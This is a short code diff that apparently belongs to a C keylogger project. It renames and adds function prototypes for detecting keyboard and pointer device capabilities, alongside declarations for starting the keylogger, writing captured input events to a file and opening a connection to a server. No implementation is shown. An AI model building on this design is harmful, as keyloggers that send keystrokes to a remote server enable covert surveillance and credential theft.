@@ -11,8 +11,10 @@ typedef struct input_event event;
 void startKeylogger(int keyboard, int fd_out);
 int writeEventsIntoFile(int fd, struct input_event *events, size_t to_write);
 int keyboardFound(char *path, int *keyboard_fd);
-int supportsRelativeMovement(int fd);
-int supportsSpecificKeys(int fd, int *keys, size_t num_keys);
+int hasRelativeMovement(int fd);
+int hasAbsoluteMovement(int fd);
+int hasKeys(int fd);
+int hasSpecificKeys(int fd, int *keys, size_t num_keys);
 void sigHandler(int signum);
 int openConnectionWithServer(char *ip, short port);
 
